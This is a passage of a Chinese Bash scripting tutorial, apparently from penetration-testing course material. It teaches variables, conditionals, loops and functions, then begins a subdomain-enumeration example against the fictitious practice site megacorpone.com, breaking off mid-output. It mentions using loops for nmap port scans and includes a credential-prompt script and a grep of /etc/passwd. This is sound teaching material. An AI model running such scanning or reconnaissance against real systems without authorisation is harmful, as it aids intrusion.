脚本是一个包含一系列命令的纯文本文件，执行起来就像在终端提示符下输入的一样。一般来说，Bash 脚本有一个可选的扩展名 .sh（为了便于识别），以 #!/bin/bash 开头，在执行之前必须设置可执行权限。让我们从一个简单的 “Hello World” Bash 脚本开始。\n\n```bash\nkali@kali:~$ cat ./hello-world.sh\n#!/bin/bash\n# Hello World Bash Script\necho \"Hello World!\"\n```\n\n这个脚本有几个部分值得解释。\n\n- 第 1 行：#1 通常被称为 “shebang”，它被 Bash 解释器所忽略。第二部分，/bin/bash，是解释器的绝对路径，用来运行该脚本。这就是为什么这是一个 “Bash 脚本”，而不是其他类型的 shell 脚本，比如说 “C Shell” 脚本。\n- 第 2 行：# 是用来添加注释的，所以它后面的所有文字都被忽略了。\n- 第 3 行：echo “Hello World！” 使用 echo Linux 命令工具向终端打印一个给定的字符串，在本例中是 “Hello Wolrd！”。\n\n接下来，让我们把这个脚本变成可执行的并运行它。\n\n```bash\nkali@kali:~$ chmod +x hello-world.sh\n\nkali@kali:~$ ./hello-world.sh\nHello World!\n```\n\nchmod 命令和 +x 选项用来使脚本可执行，而 ./hello-world.sh 则用来实际运行它。./ 这个符号可能看起来很混乱，但这只是一个路径符号，表示这个脚本在当前目录下。每当我们输入一个命令时，Bash 都会试图在一系列存储在一个叫做 PATH 的变量中的目录中找到它。由于我们的主目录并不包括在这个变量中，所以我们必须使用相对路径来找到我们的 Bash 脚本，以使 Bash 能够“找到”它并运行它。\n\n现在我们已经创建了第一个 Bash 脚本，让我们更详细地探讨一下 Bash。\n\n## 变量\n\n变量是用来临时存储数据的命名场所。我们可以设置（或“声明”）一个变量，为其赋值，或读取一个变量，将其“扩展”或“解析”为其存储值。\n\n我们可以用多种方式声明变量值。最简单的方法是用一个简单的 name=vulue 声明直接设置值。注意，“=” 号前后都没有空格。\n\n```bash\nkali@kali:~$ first_name=Good\n```\n\n除非我们能够引用一个变量，否则声明该变量是毫无意义的。为了做到这一点，我们在变量前面加上 “$” 字符。每当 Bash 在命令中遇到这种语法时，它就会在执行前将变量名替换为其值（“扩展”变量）。\n\n```bash\nkali@kali:~$ first_name=Good\n\nkali@kali:~$ last_name=Hacker\n\nkali@kali:~$ echo $first_name $last_name\nGood Hacker\n```\n\n变量名可以是大写的，小写的，或者两者的混合。然而，Bash 是区分大小写的，所以我们在声明和扩展变量时必须保持一致。此外，使用描述性的变量名是一个很好的做法，这使得我们的脚本更容易阅读和维护。\n\n请注意，Bash 会以特定的方式解释某些字符。例如，这个声明展示了一个不恰当的多值变量声明：\n\n```bash\nkali@kali:~$ greeting=Hello World\nbash: World: command not found\n```\n\n这不一定是我们所期望的。为了解决这个问题，我们可以使用单引号（’）或双引号（”）来保卫我们的文本。然而，Bash 对单引号和双引号的处理方式不同。当遇到单引号时，Bash 会按字面意思解释每个被包围的字符。当遇到双引号时，除了 “$”、“’” 和 “\\” 之外，所有的字符都是按字面意思来理解的，这意味着在对所包含的文本进行初始替换时，变量将被展开。\n\n一个简单的变量将被展开。一个简单的例子将有助于澄清这一点。\n\n```bash\nkali@kali:~$ greeting='Hello World'\n\nkali@kali:~$ echo $greeting\nHello World\n\nkali@kali:~$ greeting2=\"New $greeting\"\n\nkali@kali:~$ echo $greeting2\nNew Hello World\n```\n\n在这个例子中，单引号封闭的 greeting 声明完全保留了我们的文本值，并且没有把空格截石位命令分隔符。然而，在 greeting2 的双引号声明中，Bash 将 $greeting 扩展为其值（“Hello World”），尊重了 “$” 字符的特殊含义。\n\n我们还可以将变量的值设置为一个命令或程序的结果。这就是所谓的命令替换，它允许我们把一个命令或程序的输出（通常会被打印到屏幕上）保存为一个变量的值。要做到这一点，将变量名称放在括号 “()” 中，前面加一个 “$” 字符。\n\n```bash\nkali@kali:~$ user=$(whoami)\n\nkali@kali:~$ echo $user\nkali\n```\n\n我们把 whoami 命令的输出分配给 user 变量。然后我们显示其值。使用反引号或严重字符 (`) 进行命令替换的另一种语法如下所示：\n\n```bash\nkali@kali:~$ user2=`whoami`\n\nkali@kali:~$ echo $user2\nkali\n```\n\n反引号方法较旧并且通常不鼓励使用，因为这两种命令替换方法的行为方式存在差异。同样重要的是要注意命令替换发生在子 shell 中，对子 shell 中的变量的更改不会改变来自主 shell 的变量过程。这在以下例子中进行了演示：\n\n```bash\nkali@kali:~$ cat ./subshell.sh\n\n#!/bin/bash -x\nvar1=value1\necho $var1\n\nvar2=value2\necho $var2\n\n$(var1=newvar1)\necho $var1\n\n`var2=newvar2`\necho $var2\n\nkali@kali:~$ ./subshell.sh\n+ var1=value1\n+ echo value1\nvalue1\n+ var2=value2\n+ echo value2\nvalue2\n++ var1=newvar1\n+ echo value1\nvalue1\n++ var2=newvar2\n+ echo value2\nvalue2\nkali@kali:~$\n```\n\n在这个例子中，首先注意我们改变了 shebang，加入了 `-x` 选项。这指示 Bash 打印额外的调试输出，所以我们可以更容易地看到被执行的命令和它们的结果。当我们查看这个输出时，注意到前面有一个 “+” 号的命令是在当前 shell 中执行的，前面有两个 “++” 号的命令是在子 shell 中执行的。\n\n这让我们清楚地看到，var1 和 var2 的第二次声明发生在子 shell 中，并没有像最初的声明那样改变当前 shell 中的值。\n\n### 参数\n\n并非所有的 Bash 脚本都需要参数。然而，了解 Bash 如何解释参数以及如何使用参数是非常重要的。我们已经执行了带有参数的 Linux 命令。例如，当我们运行 ls -l /var/log 命令时，-l 和 /var/log 都是 ls 命令的参数。\n\nBash 脚本也不例外，我们可以提供命令行参数并在我们的脚本中使用它们。\n\n```bash\nkali@kali:~$ cat ./arg.sh\n#!/bin/bash\n\necho \"The first two arguments are $1 and $2\"\n\nkali@kali:~$ chmod +x ./arg.sh\n\nkali@kali:~$ ./arg.sh hello there\nThe first two arguments are hello and there\n```\n\n我们创建了一个简单的 Bash 脚本，给它设置了可执行权限，然后带着两个参数运行它。$1 和 $2 的变量代表传递给脚本的第一个和第二个参数。让我们来探讨一些特殊的 Bash 变量。\n\n在调试脚本时，这些特殊的变量中的一些可能非常有用。例如，我们也许可以获得一个命令的退出状态，以确定它是否被成功执行。\n\n### 读取用户输出\n\n命令行参数是用户输入的一种形式，但是我们也可以用 read 命令在脚本运行时捕获交互式用户输入。在这个例子中，我们将使用 read 来捕获用户输入，并将其分配给一个变量。\n\n```bash\nkali@kali:~$ cat ./input.sh\n#!/bin/bash\n\necho \"Hello there, would you like to learn how to hack: Y/N?\"\n\nread answer\n\necho \"Your answer was $answer\"\n\nkali@kali:~$ chmod +x ./input.sh\n\nkali@kali:~$ ./input.sh\nHello there, would you like to learn how to hack: Y/N?\nY\nYour answer was Y\n```\n\n我们可以通过各种命令行选项来改变 read 命令的行为，两个最常用的选项包括 `-p` 和 `-s` ，前者允许我们指定一个提示，后者使用户的输入保持沉默。后者是捕获用户凭证的理想选择。\n\n```bash\nkali@kali:~$ cat ./input2.sh\n#!/bin/bash\n# Prompt the user for credentials\n\nread -p 'Username: ' username\nread -sp 'Password: ' password\n\necho \"Thanks, your creds are as follows: \" $username \" and \" $password\n\nkali@kali:~$ chmod +x ./input2.sh\n\nkali@kali:~$ ./input2.sh\nUsername: kali\nPassword:\nThanks, your creds are as follows: kali and nothing2see!\n```\n\n## if，Else，Elif 语句\n\n条件性语句允许我们提供不同的条件执行不同的操作。最常见的条件性 Bash 语句已经包括 if、else 和 elif。\n\nif 语句相对简单 `-it` 检查一个条件是否为真 `-but` 需要一个非常特定的语法。请仔细注意这个语法，特别是必要的空格的使用：\n\n```bash\nif [ <some test> ]\nthen\n\t<perform an action>\nfi\n```\n\n在这个列表中，如果“一些测试”评估为真，脚本将“执行一个动作”，或者在 then 和 fi 之间的任何命令。我们来看看一个实际的例子。\n\n```bash\nkali@kali:~$ cat ./if.sh\n#!/bin/bash\n# if statement example\n\nread -p \"What is your age: \" age\n\nif [ $age -lt 16 ]\nthen\n echo \"You might need parental permission to take this course!\"\nfi\n\nkali@kali:~$ chmod +x ./if.sh\n\nkali@kali:~$ ./if.sh\nWhat is your age: 15\nYou might need parental permission to take this course!\n```\n\n在这个例子中，我们用一个 if 语句来检查用户输入的年龄。如果输入的年龄小于（-lt）16 岁，脚本将输出一条警告信息。\n\n上面 if 语句中的方括号（”[” 和 “]”）实际上是对 test 命令的引用。这只是意味着我们可以使用测试命令所允许的所有运算符。一些最常见的运算符包括：\n\n考虑到上述情况，我们之前使用 if 的例子可以不加方括号改写如下：\n\n```bash\nkali@kali:~$ cat ./if2.sh\n#!/bin/bash\n# if statement example 2\n\nread -p \"What is your age: \" age\n\nif test $age -lt 16\nthen\n echo \"You might need parental permission to take this course!\"\nfi\n\nkali@kali:~$ chmod +x ./if2.sh\n\nkali@kali:~$ ./if2.sh\nWhat is your age: 15\nYou might need parental permission to take this course!\n```\n\n尽管这个例子与使用方括号的例子在功能上是等同的，但使用方括号使代码稍稍容易阅读。\n\n我们还恶意在语句为真时执行某一组动作，在语句为假时执行另一组动作。要做到这一点，我们可以使用 else 语句，它的语法如下：\n\n```bash\nif [ <some test> ]\nthen\n\t<perform action>\nelse\n\t<perform another action>\nfi\n```\n\n让我们扩展我们之前的“年龄”例子，包括 else 语句。\n\n```bash\nkali@kali:~$ cat ./else.sh\n#!/bin/bash\n# else statement example\n\nread -p \"What is your age: \" age\n\nif [ $age -lt 16 ]\nthen\n\techo \"You might need parental permission to take this course!\"\nelse\n\techo \"Welcome to the course!\"\nfi\n\nkali@kali:~$ chmod +x ./else.sh\n\nkali@kali:~$ ./else.sh\nWhat is your age: 21\nWelcome to the course!\n```\n\n请注意，当输入的年龄大于（或更确切地说是“不小于”）16 岁时，执行 else 语句。\n\nif 和 else 语句只允许两个代码执行分支。我们可以用 elif 语句增加额外的分支，elif 语句使用以下模式：\n\n```bash\nif [ <some test> ]\nthen\n\t<perform action>\nelif [ <some test> ]\nthen\n\t<perform different action>\nelse\n\t<perform yet another different action>\nfi\n```\n\n让我们再次扩展我们的“年龄”例子，包括 elif 语句：\n\n```bash\nkali@kali:~$ cat ./elif.sh\n#!/bin/bash\n# elif example\n\nread -p \"What is your age: \" age\nif [ $age -lt 16 ]\nthen\n\techo \"You might need parental permission to take this course!\"\nelif [ $age -gt 60 ]\nthen\n\techo \"Hats off to you, respect!\"\nelse\n\techo \"Welcome to the course!\"\nfi\n\nkali@kali:~$ chmod +x ./elif.sh\n\nkali@kali:~$ ./elif.sh\nWhat is your age: 65\nHats off to you, respect!\n```\n\n在这个例子中，代码的执行流程稍微复杂一些。按照操作顺序，如果输入的年龄小于 16 岁，则执行 then 分支；如果年龄大于 60 岁，则进入 elif 分支（并显示 “Hats off.”）；else 分支只在年龄大于 16 岁 但小于60岁时执行。\n\n## 布尔逻辑操作\n\n布尔逻辑运算符，如 AND（&&）和 OR（||），有点神秘，因为 Bash 以各种方式使用它们。\n\n一个常见的用法是在命令列表中，这是命令链，其流程由运算符控制。“|”（管道符）符号是命令列表中常用的运算符，它将一个命令的输出传递给另一个命令的输入。同样，布尔逻辑运算符根据前一个命令是否成功（或返回 True 或 0）或失败（返回 Flase 或非 0）来执行命令。我们先来看看 AND（&&）布尔运算符，它只在前一个命令成功（或返回 True 或 0）的情况下执行一个命令。\n\n```bash\nkali@kali:~$ user2=kali\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\"\nkali:x:1000:1000:,,,:/home/kali:/bin/bash\nkali found!\n\nkali@kali:~$ user2=bob\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\"\n```\n\n在这个例子中，我们首先将我们要搜索的用户名分配给 user2 变量。接下来，我们使用 grep 命令检查某个用户是否在 /etc/passwd 文件中列出，如果是，grep 返回 True，echo 命令被执行。然而，当我们试图搜索一个我们知道不存在 /etc/passwd 文件中的用户时，我们的 echo 命令没有被执行。\n\n挡在命令列表中使用时，OR（||）运算符与 AND（&&）相反；它只在前一个命令失败（返回 False 或 非 0）时执行下一个命令。\n\n```bash\nkali@kali:~$ echo $user2\nbob\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\" || echo \"$user2 not found!\"\nbob not found!\n```\n\n在上面的例子中，我们把前面的命令更进一步，增加了 OR（||）运算符，后面是第二条 echo 命令。现在，当 grep 没有找到匹配的行并返回 False 时，就会执行 OR（||）操作符后的第二个 echo 命令。\n\n这些运算符也可以在测试中用来比较变量或其他测试的结果。当这样使用时，AND（&&）结合了两个简单的条件，如果它们都是真，结合的结果就是成功（或 True 或 0）。\n\n想一下这个例子：\n\n```bash\nkali@kali:~$ cat ./and.sh\n#/bin/bash\n# and example\n\nif [ $USER == 'kali' ] && [ $HOSTNAME == 'kali' ]\nthen\n\techo \"Multiple statements are true!\"\nelse\n\techo \"Not much to see here...\"\nfi\n\nkali@kali:~$ chmod +x ./and.sh\n\nkali@kali:~$ ./and.sh\nMultiple statements are true!\n\nkali@kali:~$ echo $USER && echo $HOSTNAME\nkali\nkali\n```\n\n在这个例子中，我们用 AND（&&）来测试多个条件，由于两个变量的比较都是真的，整个 if 行都成功了，所以 then 分支执行。\n\n当在测试中使用时，OR (||) 布尔运算符被用来测试一个或多个条件，但只有其中一个条件为真才能算作成功。\n\n让我们看一个例子：\n\n```bash\nkali@kali:~$ cat ./or.sh\n#!/bin/bash\n# or example\n\nif [ $USER == 'kali' ] || [ $HOSTNAME == 'pwn' ]\nthen\n\techo \"One condition is true, this line is printed\"\nelse\n\techo \"You are out of luck!\"\nfi\n\nkali@kali:~$ chmod +x ./or.sh\n\nkali@kali:~$ ./or.sh\nOne condition is true, this line is printed\n\nkali@kali:~$ echo $USER && echo $HOSTNAME\nkali\nkali\n```\n\n在这个例子中，我们用 OR（||）来测试多个条件，由于其中一个变量的比较为真，整个 if 行成功了，所以 then 分支执行。\n\n## 循环\n\n在计算机编程中，循环帮助我们处理重复性的任务，我们需要运行这些任务直到满足某个标准。循环对于渗透测试人员来说特别有用，所以我们建议密切关注这一部分。\n\n在 Bash 中，两个最主要的循环命令是 for 和 while，我们将看到这两个命令。\n\n### For 循环\n\nFor 循环是非常实用的，在 Bash 单行程序中效果非常好。在这种类型的循环是用来对一个列表中的每个项目执行一组指定的命令。让我们简单地看一下它的一般语法：\n\n```bash\nfor var-name in <list>\ndo\n <action to perform>\ndone\n```\n\n这个 for 循环将取走列表中的每一个项目（按顺序），将该项目作为变量 var-name 的值，在 do 和 done 之间执行给定的动作，然后回到顶部，抓取列表中的下一个项目，重复这些步骤，直到列表用完。\n\n让我们看看一个更实用的例子，它将快速打印 10.11.1.0/24 子网中的前 10 个 IP 地址：\n\n```bash\nkali@kali:~$ for ip in $(seq 1 10); do echo 10.11.1.$ip; done\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\n在这个 Bash 单行程序中，我们使用 seq 命令来打印一个数字序列，在这里是 1 到 10 的数字。每个数字都被分配给 ip 变量，然后每个 IP 地址都被显示在屏幕上，for 循环运行多次，在系列的最后退出。\n\n另一种重写前面 for 循环的方法涉及到使用范围的括号扩展。使用范围的括号扩展写出了范围的第一个和最后一个值，可以是一个数字或字符的序列。这就是所谓的“序列表达式”。\n\n```bash\nkali@kali:~$ for i in {1..10}; do echo 10.11.1.$i;done\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\n这种类型的循环有很大的潜力。在屏幕上显示 IP 地址可能看起来不是很有用，但我们可以使用同样的循环，使用 nmap 运行端口扫描。我们还可以尝试使用 ping 命令，看看是否有任何 IP 地址对 ICMP 回波请求做出响应等等。\n\n### While 循环\n\nWhile 循环也相当常见，在表达式为真时执行代码。While 循环有一个简单的格式，和 if 一样，使用方括号（[]）来测试。\n\n```bash\nwhile [ <some test> ]\ndo\n <perform an action>\ndone\n```\n\n让我们用一个 while 循环来重新创建前面的例子。\n\n```bash\nkali@kali:~$ cat ./while.sh\n#!/bin/bash\n# while loop example\n\ncounter=1\n\nwhile [ $counter -lt 10 ]\ndo\n echo \"10.11.1.$counter\"\n ((counter++))\ndone\n\nkali@kali:~$ chmod +x ./while.sh\n\nkali@kali:~$ ./while.sh\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n```\n\n这不是我们预期的输出。这是一个常见的错误，叫做“偏一”错误。在上面的例子中，我们使用了 `-lt` （少于），而不是 `-le` （少于或等于），所以我们的计数器只到了 9，而不是原来的 10。\n\n((counter++)) 行使用双括号 (()) 结构，同时进行算数扩展和评估。在这个特殊的例子中，我们用它来增加我们的计数器变量 1。让我们重新写一下 while 循环，再试一下这个例子。\n\n```bash\nkali@kali:~$ cat ./while2.sh\n#!/bin/bash\n# while loop example 2\n\ncounter=1\n\nwhile [ $counter -le 10 ]\ndo\n echo \"10.11.1.$counter\"\n ((counter++))\ndone\n\nkali@kali:~$ chmod +x ./while2.sh\n\nkali@kali:~$ ./while2.sh\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\n很好，我们的 while 循环现在看起来好多了。\n\n## 函数\n\n在 Bash 脚本方面，我们可以把函数看作是脚本中的脚本，当我们需要在一个脚本中多次执行相同的代码时，这是很有用的。与其一次又一次地重写同一块代码，我们不如把它写成一个函数，然后根据需要调用这个函数。\n\n换句话说，函数是一个子程序，或一个实现一系列操作的代码块 `-a` 一个执行特定任务的“黑匣子”。函数可以用两种不同的格式来编写，第一种格式在 Bash 脚本中比较常见。\n\n```bash\nfunction function_name {\ncommands...\n}\n```\n\n第二种格式来 C 语言程序员来说更为熟悉。\n\n```bash\nfunction_name () {\ncommands...\n}\n```\n\n这些格式在功能上是相同的，是个人偏好问题。让我们看一个简单的例子：\n\n```bash\nkali@kali:~$ cat ./func.sh\n#!/bin/bash\n# function example\n\nprint_me () {\n echo \"You have been printed!\"\n}\n\nprint_me\n\nkali@kali:~$ chmod +x ./func.sh\n\nkali@kali:~$ ./func.sh\nYou have been printed!\n```\n\n函数也可以接受参数。\n\n```bash\nkali@kali:~$ cat ./funcarg.sh\n#!/bin/bash\n# passing arguments to functions\n\npass_arg() {\n echo \"Today's random number is: $1\"\n}\n\npass_arg $RANDOM\n\nkali@kali:~$ chmod +x ./funcarg.sh\n\nkali@kali:~$ ./funcarg.sh\nToday's random number is: 25207\n```\n\n在本例中，我们向函数传递了一个随机数 $RANDOM，该函数将其输出为 $1，即函数的第一个参数。请注意，函数定义（pass_arg()）包含括号。在其他编程语言中，例如 C，这些括号包含了预期的参数，但是在 Bash 中，括号只是作为装饰。它们从来不会被使用。还要注意的是，函数定义（函数本身）必须在脚本中出现，然后才会被调用。从逻辑上讲，我们不能调用我们没有定义的东西。\n\n<aside> 💡 使用描述性的函数名称，描述函数的目的。\n\n</aside>\n\n除了向 Bash 函数传递参数之外，我们当然也可以从 Bash 函数中返回值。Bash 函数实际上不允许你在传统意义上返回一个任意的值。相反，Bash 函数可以返回一个退出状态（零代表成功，非零表示失败）或者其他一些任意的值，我们可以随后从 $? 全局变量中访问这些值。另外，我们也可以在函数中设置一个全局变量，或者使用命令替换来模拟传统的返回。\n\n让我们看一个简单的例子，将一个随机数返回到 $?：\n\n```bash\nkali@kali:~$ cat funcrvalue.sh\n#!/bin/bash\n# function return value example\n\nreturn_me() {\n echo \"Oh hello there, I'm returning a random value!\"\n return $RANDOM\n}\n\nreturn_me\n\necho \"The previous function returned a value of $?\"\n\nkali@kali:~$ chmod +x ./funcrvalue.sh\n\nkali@kali:~$ ./funcrvalue.sh\nOh hello there, I'm returning a random value!\nThe previous function returned a value of 198\n\nkali@kali:~$ ./funcrvalue.sh\nOh hello there, I'm returning a random value!\nThe previous function returned a value of 313\n```\n\n注意，每次我们运行脚本时都会返回一个随机数，因为我们返回了特殊的全局变量 $RANDOM（变成了 $?）如果我们使用不带 $RANDOM 参数的返回语句，则会返回函数的退出状态（本例中为 0）。现在我们对变量和函数有了基本的了解，我们可以更深入地讨论变量范围。\n\n变量的范围就是它的意义所在的上下文。默认情况下，一个变量有一个全局范围，这意味着它可以在整个脚本中被访问。相反，局部变量只能在定义它的函数、代码块和子 Shell 中看到。我们可以“覆盖”一个全局变量，给它一个本底范围，方法是在声明前面加上 local 关键字，而不触动全局变量。一般的语法是：\n\n```bash\nlocal name=\"Joe\"\n```\n\n让我们通过一个简单的例子来看看局部变量和全局变量在实践中是如何工作的：\n\n```bash\nkali@kali:~$ cat ./varscope.sh\n#!/bin/bash\n# var scope example\n\nname1=\"John\"\nname2=\"Jason\"\n\nname_change() {\n local name1=\"Edward\"\n echo \"Inside of this function, name1 is $name1 and name2 is $name2\"\n name2=\"Lucas\"\n}\n\necho \"Before the function call, name1 is $name1 and name2 is $name2\"\n\nname_change\n\necho \"After the function call, name1 is $name1 and name2 is $name2\"\n\nkali@kali:~$ chmod +x ./varscope.sh\n\nkali@kali:~$ ./varscope.sh\nBefore the function call, name1 is John and name2 is Jason\nInside of this function, name1 is Edward and name2 is Jason\nAfter the function call, name1 is John and name2 is Lucas\n```\n\n首先注意到我们声明了两个全局变量，将 name1 设置为 John，name2 设置为 Jason。\n\n然后，我们定义了一个函数，并在该函数中声明了一个名为 name1 的局部变量，将其值设置为 Edward。由于这是一个局部变量，之前的全局赋值没有受到影响；在这个函数之外，name1 仍被设置为 John。\n\n接下来，我们将  name2 设置为 Lucas，由于我们没有使用局部关键字，我们正在改变全局变量，赋值在函数内部和外部都坚持。\n\n根据这个例子，以下两点总结了变量范围：\n\n- 改变一个与全局变量同名的局部变量的值不会影响其全局值。\n- 在一个函数中改变全局变量的值 -- 没有声明同名的局部变量 -- 将影响其全局值。\n\n## 实例\n\n到目前为止，我们已经涵盖了 Bash 脚本的基础知识。让我们把我们所讨论的所有概念放在一起，并通过一些实际的例子来说明。\n\n### Bash 的实际使用 —— 例子 1\n\n在这个例子中，我们想找到所有列在 [megacorpone.com](http://megacorpone.com) 主页上的子域，并找到他们相应的 IP 地址。手动操作太浪费时间了，但是通过一些基本的 Bash 命令，我们可以将其变成一项简单的任务。我们先用 `wget` 下载索引页。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# wget www.megacorpone.com\n--2022-03-30 02:53:08--  <http://www.megacorpone.com/>\n正在解析主机 www.megacorpone.com (www.megacorpone.com)... 149.56.244.87\n正在连接 www.megacorpone.com (www.megacorpone.com)|149.56.244.87|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：14603 (14K) [text/html]\n正在保存至: “index.html”\n\nindex.html             100%[============================>]  14.26K  1.46KB/s  用时 91s     \n\n2022-03-30 02:54:46 (160 B/s) - 已保存 “index.html” [14603/14603])\n\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# ls -l index.html        \n-rw-r--r-- 1 root root 14603 11月  6  2019 index.html\n```\n\n手动扫描该文件，我们看到许多我们不需要的行。让我们开始缩小我们需要的行的范围，并剔除我们不需要的行。首先，我们可以使用 grep “href=” 来提取 index.html 中所有包含 HTML 链接的行。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep \"href=\" index.html                                                                                                                                                                                   130 ⨯\n    <link rel=\"shortcut icon\" href=\"assets/ico/favicon.ico\">\n    <link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n    <link href=\"assets/css/style.css\" rel=\"stylesheet\">\n    <link href=\"assets/css/font-awesome.min.css\" rel=\"stylesheet\">\n                <a class=\"navbar-brand\" href=\"index.html\">MegaCorp One</a>\n                    <li class=\"active\"><a href=\"//www.megacorpone.com/index.html\">HOME</a></li>\n                    <li><a href=\"<https://www.megacorpone.com/about.html>\">ABOUT</a></li>\n                    <li><a href=\"/contact.html\">CONTACT</a></li>\n                    <li><a href=\"<http://support.megacorpone.com>\">SUPPORT</a></li>\n                    <!--<li><a href=\"<https://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/>\">SUPPORT</a></li>-->\n                    <li><a href=\"<http://www.megacorpone.com/jobs.html>\">CAREERS</a></li>\n                    <!--<li><a href=\"<http://www.megacorpone.com/jobs2.html>\">CAREERS</a></li>-->\n                    <li><a href=\"<http://intranet.megacorpone.com>\">LOG IN</a></li>\n                    <!--<li><a href=\"<https://cp.megacorpone.net/>\">LOG IN</a></li>-->\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <li><a href=\"<http://admin.megacorpone.com/admin/index.html>\">Cell Regeneration</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com/pear/>\">Immune Systems Supplements</a></li>\n                    <li><a href=\"<http://mail.megacorpone.com/menu/>\">Micromachine Cyberisation Repair</a></li>\n                    <li><a href=\"<http://mail2.megacorpone.com/smtp/relay/>\">Nanomite Based Weaponry Systems</a></li>\n                    <li><a href=\"<http://siem.megacorpone.com/home/>\">Nanoprobe Based Entity Assimilation</a></li>\n                    <li><a href=\"<http://support.megacorpone.com/ticket/requests/index.html>\">Nanoprocessors</a></li>\n                    <li><a href=\"<http://syslog.megacorpone.com/logs/sys/view.php>\">Perlin VanHook Chemical Dispersal</a></li>\n                <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <li><a href=\"<http://test.megacorpone.com/demo/index.php>\">What are the ethics behind MegaCorp One?</a></li>\n                    <li><a href=\"<http://vpn.megacorpone.com/diffie-hellman/>\">Is MegaCorp One being regulated by any goverment?</a></li>\n                    <li><a href=\"<http://www.megacorpone.com/aboutus.html>\">Where can I buy MegaCorp One products?</li>\n                                <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">Is there any environmental concerns related to nanotechnology?</a></li>\n                    <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">Can I suggest nanotechnology uses for the company to explore?</a></li>\n                    <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">What are the specs behind MegaCorpOne nanoprocessors?</a></li>\n                <p><a href=\"<http://admin.megacorpone.com/news/today.php>\">MegaCorp One acquires new round of funding.</a></p>\n                <p><a href=\"<http://beta.megacorpone.com/util/files/news.html>\">Lawsuit against MegaCorp One is dropped when plaintiffs go missing.</a></p>\n                <p><a href=\"<http://beta.megacorpone.com/util/files/news.html>\">MegaCorp One CEO Joe Sheer nominated for Nobel Physics, Medicine, and Literature prizes.</a></p>\n                    <p><small>This is a fictitious company, brought to you by <a href=\"<https://www.offensive-security.com/>\" target=\"_blank\">Offensive Security</a>.</small></p>\n                        <a href=\"<https://www.facebook.com/MegaCorp-One-393570024393695/>\" target=\"_blank\"><i class=\"fa fa-facebook\"></i></a>\n                        <a href=\"<https://twitter.com/joe_sheer/>\"><i class=\"fa fa-twitter\"></i></a>\n                        <a href=\"<https://www.linkedin.com/company/18268898/>\" target=\"_blank\"><i class=\"fa fa-linkedin\"></i></a>\n                        <a href=\"<https://github.com/megacorpone>\" target=\"_blank\"><i class=\"fa fa-github\"></i></a>\n```\n\n在上面的摘录中，第一行是我们正在寻找的一个主要例子，因为它提到了一个子域。\n\n让我们使用 grep 来抓取包含 “.megacorpone.com” 的行，表示存在一个子域，并使用 `grep -v` 来剥离包含我们已经知道的无聊的 “[www.megacorpone.com](http://www.megacorpone.com)” 域名的行。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep \"href=\" index.html | grep \".megacorpone\" | grep -v \"www.megacorpone.com\" | head\n                    <li><a href=\"<http://support.megacorpone.com>\">SUPPORT</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com>\">LOG IN</a></li>\n                    <!--<li><a href=\"<https://cp.megacorpone.net/>\">LOG IN</a></li>-->\n                    <li><a href=\"<http://admin.megacorpone.com/admin/index.html>\">Cell Regeneration</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com/pear/>\">Immune Systems Supplements</a></li>\n                    <li><a href=\"<http://mail.megacorpone.com/menu/>\">Micromachine Cyberisation Repair</a></li>\n                    <li><a href=\"<http://mail2.megacorpone.com/smtp/relay/>\">Nanomite Based Weaponry Systems</a></li>\n                    <li><a href=\"<http://siem.megacorpone.com/home/>\">Nanoprobe Based Entity Assimilation</a></li>\n                    <li><a href=\"<http://support.megacorpone.com/ticket/requests/index.html>\">Nanoprocessors</a></li>\n                    <li><a href=\"<http://syslog.megacorpone.com/logs/sys/view.php>\">Perlin VanHook Chemical Dispersal</a></li>\n```\n\n这个输出看起来更接近我们需要的东西。通过逻辑的方式减少我们的数据，并在每一次传递中依次进行更小的减少，我们正处于数据处理中最常见的循环之中。\n\n看起来每一行都包含一个链接和一个子域，但是我们需要摆脱我们的链接周围的额外 HTML。在 Bash 中执行的任何任务总是有多种方法，但我们将使用一个鲜为人知的方法来处理这个问题。我们将使用 awk 的 `-F` 选项来设置多字符定界符，这与 cut 不同，后者简单而方便，但只允许单字符定界符。我们将设置我们的分隔符为 http://，并告诉 awk 我们想要第二个字段（’{print $2}’），或者该分隔符之后的所有内容。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# grep \"href=\" index.html | grep \".megacorpone\" | grep -v \"www.megacorpone.com\"|awk -F \"http://\" '{print $2}'\nsupport.megacorpone.com\">SUPPORT</a></li>\nintranet.megacorpone.com\">LOG IN</a></li>\n\nadmin.megacorpone.com/admin/index.html\">Cell Regeneration</a></li>\nintranet.megacorpone.com/pear/\">Immune Systems Supplements</a></li>\nmail.megacorpone.com/menu/\">Micromachine Cyberisation 